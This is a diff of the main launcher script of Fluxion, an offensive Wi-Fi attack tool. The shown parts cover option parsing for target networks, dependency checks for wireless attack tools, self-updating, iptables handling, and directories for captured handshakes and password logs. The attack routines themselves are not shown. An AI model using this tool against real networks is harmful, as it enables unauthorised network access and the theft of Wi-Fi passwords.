@@ -1,2558 +1,1917 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
-########## DEBUG Mode ##########
-if [ -z ${FLUX_DEBUG+x} ]; then FLUX_DEBUG=0
-    else FLUX_DEBUG=1
+# ============================================================ #
+# ================== < FLUXION Parameters > ================== #
+# ============================================================ #
+# Path to directory containing the FLUXION executable script.
+readonly FLUXIONPath=$(dirname $(readlink -f "$0"))
+
+# Path to directory containing the FLUXION library (scripts).
+readonly FLUXIONLibPath="$FLUXIONPath/lib"
+
+# Path to the temp. directory available to FLUXION & subscripts.
+readonly FLUXIONWorkspacePath="/tmp/fluxspace"
+readonly FLUXIONIPTablesBackup="$FLUXIONPath/iptables-rules"
+
+# Path to FLUXION's preferences file, to be loaded afterward.
+readonly FLUXIONPreferencesFile="$FLUXIONPath/preferences/preferences.conf"
+
+# Constants denoting the reference noise floor & ceiling levels.
+# These are used by the the wireless network scanner visualizer.
+readonly FLUXIONNoiseFloor=-90
+readonly FLUXIONNoiseCeiling=-60
+
+readonly FLUXIONVersion=5
+readonly FLUXIONRevision=9
+
+# Declare window ration bigger = smaller windows
+FLUXIONWindowRatio=4
+
+# Allow to skip dependencies if required, not recommended
+FLUXIONSkipDependencies=1
+
+# Check if there are any missing dependencies
+FLUXIONMissingDependencies=0
+
+# Allow to use 5ghz support
+FLUXIONEnable5GHZ=0
+
+# ============================================================ #
+# ================= < Script Sanity Checks > ================= #
+# ============================================================ #
+if [ $EUID -ne 0 ]; then # Super User Check
+  echo -e "\\033[31mAborted, please execute the script as root.\\033[0m"; exit 1
 fi
-################################
 
-####### preserve network #######
-if [ -z ${KEEP_NETWORK+x} ]; then KEEP_NETWORK=0
-    else KEEP_NETWORK=1
-fi
-################################
-
-###### AUTO CONFIG SETUP #######
-if [ -z ${FLUX_AUTO+x} ]; then FLUX_AUTO=0
-    else FLUX_AUTO=1
-fi
-################################
-
-if [[ $EUID -ne 0 ]]; then
-        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root.""\e[0m"""
-        exit 1
+# ===================== < XTerm Checks > ===================== #
+# TODO: Run the checks below only if we're not using tmux.
+if [ ! "${DISPLAY:-}" ]; then # Assure display is available.
+  echo -e "\\033[31mAborted, X (graphical) session unavailable.\\033[0m"; exit 2
 fi
 
-if [ -z "${DISPLAY:-}" ]; then
-    echo -e "\e[1;31mThe script should be exected inside a X (graphical) session.""\e[0m"""
-    exit 1
+if ! hash xdpyinfo 2>/dev/null; then # Assure display probe.
+  echo -e "\\033[31mAborted, xdpyinfo is unavailable.\\033[0m"; exit 3
 fi
 
-clear
+if ! xdpyinfo &>/dev/null; then # Assure display info available.
+  echo -e "\\033[31mAborted, xterm test session failed.\\033[0m"; exit 4
+fi
 
-##################################### < CONFIGURATION  > #####################################
-DUMP_PATH="/tmp/TMPflux"
-HANDSHAKE_PATH="/root/handshakes"
-PASSLOG_PATH="/root/pwlog"
-WORK_DIR=`pwd`
-DEAUTHTIME="9999999999999"
-revision=9
-version=2
-IP=192.168.1.1
-RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
+# ================ < Parameter Parser Check > ================ #
+getopt --test > /dev/null # Assure enhanced getopt (returns 4).
+if [ $? -ne 4 ]; then
+  echo "\\033[31mAborted, enhanced getopt isn't available.\\033[0m"; exit 5
+fi
 
-#Colors
-white="\033[1;37m"
-grey="\033[0;37m"
-purple="\033[0;35m"
-red="\033[1;31m"
-green="\033[1;32m"
-yellow="\033[1;33m"
-Purple="\033[0;35m"
-Cyan="\033[0;36m"
-Cafe="\033[0;33m"
-Fiuscha="\033[0;35m"
-blue="\033[1;34m"
-transparent="\e[0m"
+# =============== < Working Directory Check > ================ #
+if ! mkdir -p "$FLUXIONWorkspacePath" &> /dev/null; then
+  echo "\\033[31mAborted, can't generate a workspace directory.\\033[0m"; exit 6
+fi
 
-general_back="Back"
-general_error_1="Not_Found"
-general_case_error="Unknown option. Choose again"
-general_exitmode="Cleaning and closing"
-general_exitmode_1="Disabling monitoring interface"
-general_exitmode_2="Disabling interface"
-general_exitmode_3="Disabling "$grey"forwarding of packets"
-general_exitmode_4="Cleaning "$grey"iptables"
-general_exitmode_5="Restoring "$grey"tput"
-general_exitmode_6="Restarting "$grey"Network-Manager"
-general_exitmode_7="Cleanup performed successfully!"
-general_exitmode_8="Thanks for using fluxion"
-#############################################################################################
+# Once sanity check is passed, we can start to load everything.
 
-# DEBUG MODE = 0 ; DEBUG MODE = 1 [Normal Mode / Developer Mode]
-if [ $FLUX_DEBUG = 1 ]; then
-        ## Developer Mode
-        export flux_output_device=/dev/stdout
-        HOLD="-hold"
+# ============================================================ #
+# =================== < Library Includes > =================== #
+# ============================================================ #
+source "$FLUXIONLibPath/installer/InstallerUtils.sh"
+source "$FLUXIONLibPath/InterfaceUtils.sh"
+source "$FLUXIONLibPath/SandboxUtils.sh"
+source "$FLUXIONLibPath/FormatUtils.sh"
+source "$FLUXIONLibPath/ColorUtils.sh"
+source "$FLUXIONLibPath/IOUtils.sh"
+source "$FLUXIONLibPath/HashUtils.sh"
+source "$FLUXIONLibPath/HelpUtils.sh"
+
+# NOTE: These are configured after arguments are loaded (later).
+
+# ============================================================ #
+# =================== < Parse Parameters > =================== #
+# ============================================================ #
+if ! FLUXIONCLIArguments=$(
+    getopt --options="vdk5rinmtbhe:c:l:a:r" \
+      --longoptions="debug,version,killer,5ghz,installer,reloader,help,airmon-ng,multiplexer,target,test,auto,bssid:,essid:,channel:,language:,attack:,ratio,skip-dependencies" \
+      --name="FLUXION V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
+  ); then
+  echo -e "${CRed}Aborted$CClr, parameter error detected..."; exit 5
+fi
+
+AttackCLIArguments=${FLUXIONCLIArguments##* -- }
+readonly FLUXIONCLIArguments=${FLUXIONCLIArguments%%-- *}
+if [ "$AttackCLIArguments" = "$FLUXIONCLIArguments" ]; then
+  AttackCLIArguments=""
+fi
+
+
+# ============================================================ #
+# ================== < Load Configurables > ================== #
+# ============================================================ #
+
+# ============= < Argument Loaded Configurables > ============ #
+eval set -- "$FLUXIONCLIArguments" # Set environment parameters.
+
+#[ "$1" != "--" ] && readonly FLUXIONAuto=1 # Auto-mode if using CLI.
+while [ "$1" != "" ] && [ "$1" != "--" ]; do
+  case "$1" in
+    -v|--version) echo "FLUXION V$FLUXIONVersion.$FLUXIONRevision"; exit;;
+    -h|--help) fluxion_help; exit;;
+    -d|--debug) readonly FLUXIONDebug=1;;
+    -k|--killer) readonly FLUXIONWIKillProcesses=1;;
+    -5|--5ghz) FLUXIONEnable5GHZ=1;;
+    -r|--reloader) readonly FLUXIONWIReloadDriver=1;;
+    -n|--airmon-ng) readonly FLUXIONAirmonNG=1;;
+    -m|--multiplexer) readonly FLUXIONTMux=1;;
+    -b|--bssid) FluxionTargetMAC=$2; shift;;
+    -e|--essid) FluxionTargetSSID=$2; shift;
+      # TODO: Rearrange declarations to have routines available for use here.
+      FluxionTargetSSIDClean=$(echo "$FluxionTargetSSID" | sed -r 's/( |\/|\.|\~|\\)+/_/g'); shift;;
+    -c|--channel) FluxionTargetChannel=$2; shift;;
+    -l|--language) FluxionLanguage=$2; shift;;
+    -a|--attack) FluxionAttack=$2; shift;;
+    -i|--install) FLUXIONSkipDependencies=0; shift;;
+    --ratio) FLUXIONWindowRatio=$2; shift;;
+    --auto) readonly FLUXIONAuto=1;;
+    --skip-dependencies) readonly FLUXIONSkipDependencies=1;;
+  esac
+  shift # Shift new parameters
+done
+
+shift # Remove "--" to prepare for attacks to read parameters.
+# Executable arguments are handled after subroutine definition.
+
+# =================== < User Preferences > =================== #
+# Load user-defined preferences if there's an executable script.
+# If no script exists, prepare one for the user to store config.
+# WARNING: Preferences file must assure no redeclared constants.
+if [ -x "$FLUXIONPreferencesFile" ]; then
+  source "$FLUXIONPreferencesFile"
 else
-        ## Normal Mode
-        export flux_output_device=/dev/null
-        HOLD=""
+  echo '#!/usr/bin/env bash' > "$FLUXIONPreferencesFile"
+  chmod u+x "$FLUXIONPreferencesFile"
 fi
 
-# Delete Log only in Normal Mode !
-function conditional_clear() {
+# ================ < Configurable Constants > ================ #
+if [ "$FLUXIONAuto" != "1" ]; then # If defined, assure 1.
+  readonly FLUXIONAuto=${FLUXIONAuto:+1}
+fi
 
-        if [[ "$flux_output_device" != "/dev/stdout" ]]; then clear; fi
-}
+if [ "$FLUXIONDebug" != "1" ]; then # If defined, assure 1.
+  readonly FLUXIONDebug=${FLUXIONDebug:+1}
+fi
 
-function airmon {
-        chmod +x lib/airmon/airmon.sh
-}
-airmon
+if [ "$FLUXIONAirmonNG" != "1" ]; then # If defined, assure 1.
+  readonly FLUXIONAirmonNG=${FLUXIONAirmonNG:+1}
+fi
 
-# Check Updates
-function checkupdatess {
+if [ "$FLUXIONWIKillProcesses" != "1" ]; then # If defined, assure 1.
+  readonly FLUXIONWIKillProcesses=${FLUXIONWIKillProcesses:+1}
+fi
 
-        revision_online="$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/FluxionNetwork/fluxion/master/fluxion" 2>/dev/null| grep "^revision" | cut -d "=" -f2)"
-        if [ -z "$revision_online" ]; then
-                echo "?">$DUMP_PATH/Irev
-        else
-                echo "$revision_online">$DUMP_PATH/Irev
+if [ "$FLUXIONWIReloadDriver" != "1" ]; then # If defined, assure 1.
+  readonly FLUXIONWIReloadDriver=${FLUXIONWIReloadDriver:+1}
+fi
+
+# FLUXIONDebug [Normal Mode "" / Developer Mode 1]
+if [ $FLUXIONDebug ]; then
+  :> /tmp/fluxion_debug_log
+  readonly FLUXIONOutputDevice="/tmp/fluxion_debug_log"
+  readonly FLUXIONHoldXterm="-hold"
+else
+  readonly FLUXIONOutputDevice="/dev/null"
+  readonly FLUXIONHoldXterm=""
+fi
+
+# ================ < Configurable Variables > ================ #
+readonly FLUXIONPromptDefault="$CRed[${CSBlu}fluxion$CSYel@$CSWht$HOSTNAME$CClr$CRed]-[$CSYel~$CClr$CRed]$CClr "
+FLUXIONPrompt=$FLUXIONPromptDefault
+
+readonly FLUXIONVLineDefault="$CRed[$CSYel*$CClr$CRed]$CClr"
+FLUXIONVLine=$FLUXIONVLineDefault
+
+# ================== < Library Parameters > ================== #
+readonly InterfaceUtilsOutputDevice="$FLUXIONOutputDevice"
+
+readonly SandboxWorkspacePath="$FLUXIONWorkspacePath"
+readonly SandboxOutputDevice="$FLUXIONOutputDevice"
+
+readonly InstallerUtilsWorkspacePath="$FLUXIONWorkspacePath"
+readonly InstallerUtilsOutputDevice="$FLUXIONOutputDevice"
+readonly InstallerUtilsNoticeMark="$FLUXIONVLine"
+
+readonly PackageManagerLog="$InstallerUtilsWorkspacePath/package_manager.log"
+
+declare  IOUtilsHeader="fluxion_header"
+readonly IOUtilsQueryMark="$FLUXIONVLine"
+readonly IOUtilsPrompt="$FLUXIONPrompt"
+
+readonly HashOutputDevice="$FLUXIONOutputDevice"
+
+# ============================================================ #
+# =================== < Default Language > =================== #
+# ============================================================ #
+# Set by default in case fluxion is aborted before setting one.
+source "$FLUXIONPath/language/en.sh"
+
+# ============================================================ #
+# ================== < Startup & Shutdown > ================== #
+# ============================================================ #
+fluxion_startup() {
+  if [ "$FLUXIONDebug" ]; then return 1; fi
+
+  # Make sure that we save the iptable files
+  iptables-save >"$FLUXIONIPTablesBackup"
+  local banner=()
+
+  format_center_literals \
+    " ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐"
+  banner+=("$FormatCenterLiterals")
+  format_center_literals \
+    " ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║"
+  banner+=("$FormatCenterLiterals")
+  format_center_literals \
+    " ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜"
+  banner+=("$FormatCenterLiterals")
+  format_center_literals \
+    " ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║"
+  banner+=("$FormatCenterLiterals")
+  format_center_literals \
+    " ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘"
+  banner+=("$FormatCenterLiterals")
+  format_center_literals \
+    "¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯"
+  banner+=("$FormatCenterLiterals")
+
+  clear
+
+  if [ "$FLUXIONAuto" ]; then echo -e "$CBlu"; else echo -e "$CRed"; fi
+
+  for line in "${banner[@]}"; do
+    echo "$line"; sleep 0.05
+  done
+
+  echo # Do not remove.
+
+  sleep 0.1
+  local -r fluxionRepository="https://github.com/FluxionNetwork/fluxion"
+  format_center_literals "${CGrn}Site: ${CRed}$fluxionRepository$CClr"
+  echo -e "$FormatCenterLiterals"
+
+  sleep 0.1
+  local -r versionInfo="${CSRed}FLUXION $FLUXIONVersion$CClr"
+  local -r revisionInfo="(rev. $CSBlu$FLUXIONRevision$CClr)"
+  local -r credits="by$CCyn FluxionNetwork$CClr"
+  format_center_literals "$versionInfo $revisionInfo $credits"
+  echo -e "$FormatCenterLiterals"
+
+  sleep 0.1
+  local -r fluxionDomain="raw.githubusercontent.com"
+  local -r fluxionPath="FluxionNetwork/fluxion/master/fluxion.sh"
+  local -r updateDomain="github.com"
+  local -r updatePath="FluxionNetwork/fluxion/archive/master.zip"
+  if installer_utils_check_update "https://$fluxionDomain/$fluxionPath" \
+    "FLUXIONVersion=" "FLUXIONRevision=" \
+    $FLUXIONVersion $FLUXIONRevision; then
+    installer_utils_run_update "https://$updateDomain/$updatePath" \
+      "FLUXION-V$FLUXIONVersion.$FLUXIONRevision" "$FLUXIONPath"
+    fluxion_shutdown
+  fi
+
+  echo # Do not remove.
+
+  local requiredCLITools=(
+    "aircrack-ng" "bc" "awk:awk|gawk|mawk"
+    "curl" "cowpatty" "dhcpd:isc-dhcp-server|dhcp" "7zr:p7zip" "hostapd" "lighttpd"
+    "iwconfig:wireless-tools" "macchanger" "mdk3" "nmap" "openssl"
+    "php-cgi" "pyrit" "xterm" "rfkill" "unzip" "route:net-tools"
+    "fuser:psmisc" "killall:psmisc"
+  )
+
+    while ! installer_utils_check_dependencies requiredCLITools[@]; do
+        if ! installer_utils_run_dependencies InstallerUtilsCheckDependencies[@]; then
+            echo
+            echo -e "${CRed}Dependency installation failed!$CClr"
+            echo    "Press enter to retry, ctrl+c to exit..."
+            read -r bullshit
         fi
+    done
+    if [ $FLUXIONMissingDependencies -eq 1 ]  && [ $FLUXIONSkipDependencies -eq 1 ];then
+        echo -e "\n\n"
+        format_center_literals "[ ${CSRed}Missing dependencies: try to install using ./fluxion.sh -i${CClr} ]"
+        echo -e "$FormatCenterLiterals"; sleep 3
 
+        exit 7
+    fi
+
+  echo -e "\\n\\n" # This echo is for spacing
 }
 
-# Animation
-function spinner {
+fluxion_shutdown() {
+  if [ $FLUXIONDebug ]; then return 1; fi
 
-        local pid=$1
-        local delay=0.15
-        local spinstr='|/-\'
-                while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-                        local temp=${spinstr#?}
-                        printf " [%c]  " "$spinstr"
-                        local spinstr=$temp${spinstr%"$temp"}
-                        sleep $delay
-                        printf "\b\b\b\b\b\b"
-                done
-        printf "    \b\b\b\b"
+  # Show the header if the subroutine has already been loaded.
+  if type -t fluxion_header &> /dev/null; then
+    fluxion_header
+  fi
+
+  echo -e "$CWht[$CRed-$CWht]$CRed $FLUXIONCleanupAndClosingNotice$CClr"
+
+  # Get running processes we might have to kill before exiting.
+  local processes
+  readarray processes < <(ps -A)
+
+  # Currently, fluxion is only responsible for killing airodump-ng, since
+  # fluxion explicitly uses it to scan for candidate target access points.
+  # NOTICE: Processes started by subscripts, such as an attack script,
+  # MUST BE TERMINATED BY THAT SCRIPT in the subscript's abort handler.
+  local -r targets=("airodump-ng")
+
+  local targetID # Program identifier/title
+  for targetID in "${targets[@]}"; do
+    # Get PIDs of all programs matching targetPID
+    local targetPID
+    targetPID=$(
+      echo "${processes[@]}" | awk '$4~/'"$targetID"'/{print $1}'
+    )
+    if [ ! "$targetPID" ]; then continue; fi
+    echo -e "$CWht[$CRed-$CWht] `io_dynamic_output $FLUXIONKillingProcessNotice`"
+    kill -s SIGKILL $targetPID &> $FLUXIONOutputDevice
+  done
+
+  # Assure changes are reverted if installer was activated.
+  if [ "$PackageManagerCLT" ]; then
+    echo -e "$CWht[$CRed-$CWht] "$(
+      io_dynamic_output "$FLUXIONRestoringPackageManagerNotice"
+    )"$CClr"
+    # Notice: The package manager has already been restored at this point.
+    # InstallerUtils assures the manager is restored after running operations.
+  fi
+
+  # If allocated interfaces exist, deallocate them now.
+  if [ ${#FluxionInterfaces[@]} -gt 0 ]; then
+    local interface
+    for interface in "${!FluxionInterfaces[@]}"; do
+      # Only deallocate fluxion or airmon-ng created interfaces.
+      if [[ "$interface" == "flux"* || "$interface" == *"mon"* || "$interface" == "prism"* ]]; then
+        fluxion_deallocate_interface $interface
+      fi
+    done
+  fi
+
+  echo -e "$CWht[$CRed-$CWht] $FLUXIONDisablingCleaningIPTablesNotice$CClr"
+  if [ -f "$FLUXIONIPTablesBackup" ]; then
+    iptables-restore <"$FLUXIONIPTablesBackup" \
+      &> $FLUXIONOutputDevice
+  else
+    iptables --flush
+    iptables --table nat --flush
+    iptables --delete-chain
+    iptables --table nat --delete-chain
+  fi
+
+  echo -e "$CWht[$CRed-$CWht] $FLUXIONRestoringTputNotice$CClr"
+  tput cnorm
+
+  if [ ! $FLUXIONDebug ]; then
+    echo -e "$CWht[$CRed-$CWht] $FLUXIONDeletingFilesNotice$CClr"
+    sandbox_remove_workfile "$FLUXIONWorkspacePath/*"
+  fi
+
+  if [ $FLUXIONWIKillProcesses ]; then
+    echo -e "$CWht[$CRed-$CWht] $FLUXIONRestartingNetworkManagerNotice$CClr"
+
+    # TODO: Add support for other network managers (wpa_supplicant?).
+    if [ ! -x "$(command -v systemctl)" ]; then
+        if [ -x "$(command -v service)" ];then
+        service network-manager restart &> $FLUXIONOutputDevice &
+        service networkmanager restart &> $FLUXIONOutputDevice &
+        service networking restart &> $FLUXIONOutputDevice &
+      fi
+    else
+      systemctl restart network-manager.service &> $FLUXIONOutputDevice &
+    fi
+  fi
+
+  echo -e "$CWht[$CGrn+$CWht] $CGrn$FLUXIONCleanupSuccessNotice$CClr"
+  echo -e "$CWht[$CGrn+$CWht] $CGry$FLUXIONThanksSupportersNotice$CClr"
+
+  sleep 3
+
+  clear
+
+  exit 0
+}
+
+
+# ============================================================ #
+# ================= < Handler Subroutines > ================== #
+# ============================================================ #
+# Delete log only in Normal Mode !
+fluxion_conditional_clear() {
+  # Clear iff we're not in debug mode
+  if [ ! $FLUXIONDebug ]; then clear; fi
+}
+
+fluxion_conditional_bail() {
+  echo ${1:-"Something went wrong, whoops! (report this)"}
+  sleep 5
+  if [ ! $FLUXIONDebug ]; then
+    fluxion_handle_exit
+    return 1
+  fi
+  echo "Press any key to continue execution..."
+  read -r bullshit
 }
 
 # ERROR Report only in Developer Mode
-function err_report {
-        echo "Error on line $1"
-}
+if [ $FLUXIONDebug ]; then
+  fluxion_error_report() {
+    echo "Exception caught @ line #$1"
+  }
 
-if [ $FLUX_DEBUG = 1 ]; then
-        trap 'err_report $LINENUM' ERR
+  trap 'fluxion_error_report $LINENO' ERR
 fi
 
-#Function to executed in case of unexpected termination
-trap exitmode SIGINT SIGHUP
+fluxion_handle_abort_attack() {
+  if [ $(type -t stop_attack) ]; then
+    stop_attack &> $FLUXIONOutputDevice
+    unprep_attack &> $FLUXIONOutputDevice
+  else
+    echo "Attack undefined, can't stop anything..." > $FLUXIONOutputDevice
+  fi
 
-source lib/exitmode.sh
-
-#Languages for the web interface
-source language/source
-
-# Design
-function top(){
-
-        conditional_clear
-        echo -e "$red[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]"
-        echo -e "$red[                                                      ]"
-  echo -e "$red[  $red    FLUXION $version" "${yellow} ${red}  < F""${yellow}luxion" "${red}I""${yellow}s" "${red}T""${yellow}he ""${red}F""${yellow}uture >     "              ${blue}"    ]"
-        echo -e "$blue[                                                      ]"
-        echo -e "$blue[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]""$transparent"
-        echo
-        echo
-
+  fluxion_target_tracker_stop
 }
 
-############################################## < START > ##############################################
+# In case of abort signal, abort any attacks currently running.
+trap fluxion_handle_abort_attack SIGABRT
 
-# Check requirements
-function checkdependences {
-
-        echo -ne "aircrack-ng....."
-        if ! hash aircrack-ng 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "aireplay-ng....."
-        if ! hash aireplay-ng 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "airmon-ng......."
-        if ! hash airmon-ng 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "airodump-ng....."
-        if ! hash airodump-ng 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "awk............."
-        if ! hash awk 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "curl............"
-        if ! hash curl 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "dhcpd..........."
-        if ! hash dhcpd 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "hostapd........."
-        if ! hash hostapd 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "iwconfig........"
-        if ! hash iwconfig 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "lighttpd........"
-        if ! hash lighttpd 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "macchanger......"
-        if ! hash macchanger 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-            echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "mdk3............"
-        if ! hash mdk3 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "nmap............"
-        if ! [ -f /usr/bin/nmap ]; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "php-cgi........."
-        if ! [ -f /usr/bin/php-cgi ]; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "pyrit..........."
-        if ! hash pyrit 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "python.........."
-        if ! hash python 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "unzip..........."
-        if ! hash unzip 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "xterm..........."
-        if ! hash xterm 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "openssl........."
-        if ! hash openssl 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "rfkill.........."
-        if ! hash rfkill 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "strings........."
-        if ! hash strings 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent" (binutils)"
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-        echo -ne "fuser..........."
-        if ! hash fuser 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent" (psmisc)"
-                exit=1
-        else
-                echo -e "\e[1;32mOK!"$transparent""
-        fi
-        sleep 0.025
-
-
-
-        if [ "$exit" = "1" ]; then
-        exit 1
-        fi
-
-        sleep 1
-        clear
-}
-top
-checkdependences
-
-# Create working directory
-if [ ! -d $DUMP_PATH ]; then
-        mkdir -p $DUMP_PATH &>$flux_output_device
-fi
-
-# Create handshake directory
-if [ ! -d $HANDSHAKE_PATH ]; then
-        mkdir -p $HANDSHAKE_PATH &>$flux_output_device
-fi
-
-#create password log directory
-if [ ! -d $PASSLOG_PATH ]; then
-        mkdir -p $PASSLOG_PATH &>$flux_output_device
-fi
-
-
-
-if [ $FLUX_DEBUG != 1 ]; then
-        clear; echo ""
-                   sleep 0.01 && echo -e "$red "
-           sleep 0.01 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
-           sleep 0.01 && echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "
-           sleep 0.01 && echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
-           sleep 0.01 && echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "
-           sleep 0.01 && echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
-           sleep 0.01 && echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯  "
-
-        echo""
-
-        sleep 0.1
-        echo -e $red"                     FLUXION "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" ghost"
-        sleep 0.1
-        echo -e $green "           Page:"$red"https://github.com/FluxionNetwork/fluxion  "$transparent
-        sleep 0.1
-        echo -n "                              Latest rev."
-        tput civis
-        checkupdatess &
-        spinner "$!"
-        revision_online=$(cat $DUMP_PATH/Irev)
-        echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"
-                if [ "$revision_online" != "?" ]; then
-
-                        if [ "$revision" -lt "$revision_online" ]; then
-                                echo
-                                echo
-                                echo -ne $red"            New revision found! "$yellow
-                                echo -ne "Update? [Y/n]: "$transparent
-                                read -N1 doupdate
-                                echo -ne "$transparent"
-                                doupdate=${doupdate:-"Y"}
-
-                            if [ "$doupdate" = "Y" ]; then
-                                cp $0 $HOME/flux_rev-$revision.backup
-                                curl "https://raw.githubusercontent.com/FluxionNetwork/fluxion/master/fluxion" -s -o $0
-                                echo
-                                echo
-                                echo -e ""$red"Updated successfully! Restarting the script to apply the changes ..."$transparent""
-                                sleep 3
-                                chmod +x $0
-                                exec $0
-                                exit
-                            fi
-                        fi
-                fi
-        echo ""
-        tput cnorm
-        sleep 1
-
-fi
-
-# Show info for the selected AP
-function infoap {
-
-        Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
-        Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
-        echo "INFO WIFI"
-        echo
-        echo -e "               "$blue"SSID"$transparent" = $Host_SSID / $Host_ENC"
-        echo -e "               "$blue"Channel"$transparent" = $channel"
-        echo -e "               "$blue"Speed"$transparent" = ${speed:2} Mbps"
-        echo -e "               "$blue"BSSID"$transparent" = $mac (\e[1;33m$Host_MAC_MODEL $transparent)"
-        echo
-}
-############################################### < MENU > ###############################################
-
-# Windows + Resolution
-function setresolution {
-
-        function resA {
-
-                TOPLEFT="-geometry 90x13+0+0"
-                TOPRIGHT="-geometry 83x26-0+0"
